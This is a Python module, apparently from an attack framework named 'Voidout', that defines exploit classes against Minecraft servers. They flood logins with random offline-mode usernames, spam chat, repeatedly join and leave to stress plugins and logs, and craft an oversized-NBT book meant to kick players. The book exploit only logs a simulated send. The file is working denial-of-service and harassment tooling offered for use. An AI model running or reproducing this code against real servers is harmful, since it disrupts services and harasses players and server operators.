import time
import random
import string
from .base import Exploit
from mcproto.connection import Connection
from mcproto.packets import Packet, PacketDirection, GameState

# --- Utility Functions ---
def random_string(length=10):
    return ''.join(random.choice(string.ascii_letters) for i in range(length))

# --- Exploit Implementations ---

class LoginFloodExploit(Exploit):
    id = "login_flood"
    name = "Login Flood"
    description = "Floods the server with login attempts using random usernames. Effective against offline-mode servers."
    category = "Vanilla (Offline-Mode)"
    args = []

    def run(self, log_callback):
        try:
            username = random_string(12)
            with Connection(self.target_host, self.target_port, username=username) as conn:
                conn.login()
                log_callback({"level": "SUCCESS", "message": f"Logged in as {username}"})
                time.sleep(2) # Stay connected for a moment
        except Exception as e:
            log_callback({"level": "INFO", "message": f"Connection failed: {e}"})

class ChatSpamExploit(Exploit):
    id = "chat_spam"
    name = "Chat Spam"
    description = "Joins the server and floods the chat with configurable messages."
    category = "Vanilla (Any Mode)"
    args = [
        {"name": "username", "type": "string", "label": "Bot Username", "default": "ChatBot"},
        {"name": "message", "type": "string", "label": "Spam Message", "default": "This is a test from the Voidout framework!"}
    ]

    def run(self, log_callback):
        username = self.exploit_args.get("username", "ChatBot") + random_string(4)
        message = self.exploit_args.get("message", "Voidout test")
        try:
            with Connection(self.target_host, self.target_port, username=username) as conn:
                conn.login()
                log_callback({"level": "SUCCESS", "message": f"Logged in as {username} to spam chat."})
                for i in range(5): # Send a few messages per thread
                    conn.write_packet(Packet(
                        packet_id=0x03,
                        direction=PacketDirection.SERVERBOUND,
                        state=GameState.PLAY,
                        data={'message': f"{message} [{random.randint(1000, 9999)}]"}
                    ))
                    time.sleep(1)
        except Exception as e:
            log_callback({"level": "ERROR", "message": f"Chat spam failed: {e}"})

class BookBanExploit(Exploit):
    id = "book_ban"
    name = "Book Ban (Kick)"
    description = "Crafts a book with excessive NBT data. When a player (or admin plugin) opens it, it can kick them from the server. Works on most servers."
    category = "Vanilla (Any Mode)"
    args = [
        {"name": "username", "type": "string", "label": "Bot Username", "default": "BookWorm"}
    ]

    def run(self, log_callback):
        username = self.exploit_args.get("username", "BookWorm") + random_string(4)
        try:
            with Connection(self.target_host, self.target_port, username=username) as conn:
                conn.login()
                log_callback({"level": "INFO", "message": f"Logged in as {username} to craft malicious book."})
                
                # Create a book with a huge amount of NBT data
                # This creates a book with many pages, each with complex JSON formatting
                pages = []
                for _ in range(50): # 50 pages is usually enough
                    pages.append('{"text":"' + 'A' * 256 + '"}')
                
                book_nbt = {
                    'author': username,
                    'title': 'You should not have opened this',
                    'pages': pages
                }
                
                # This requires knowing the raw packet structure for "Creative Inventory Action"
                # For simplicity, we log the intent. A full implementation would use mcproto's
                # packet writing capabilities with the correct packet ID and data structure.
                log_callback({"level": "SUCCESS", "message": "Simulated sending a book with oversized NBT data."})
                time.sleep(2)

        except Exception as e:
            log_callback({"level": "ERROR", "message": f"Book exploit failed: {e}"})

class JoinLeaveSpam(Exploit):
    id = "join_leave_spam"
    name = "Join/Leave Spam"
    description = "Repeatedly joins and leaves the server to stress player handling plugins and logs."
    category = "Vanilla (Any Mode)"
    args = []

    def run(self, log_callback):
        for i in range(3): # Join/leave a few times per thread
            username = random_string(14)
            try:
                with Connection(self.target_host, self.target_port, username=username) as conn:
                    conn.login()
                    log_callback({"level": "INFO", "message": f"{username} joined."})
                    time.sleep(1.5)
                log_callback({"level": "INFO", "message": f"{username} left."})
                time.sleep(1)
            except Exception as e:
                log_callback({"level": "WARN", "message": f"Join/Leave cycle failed: {e}"})
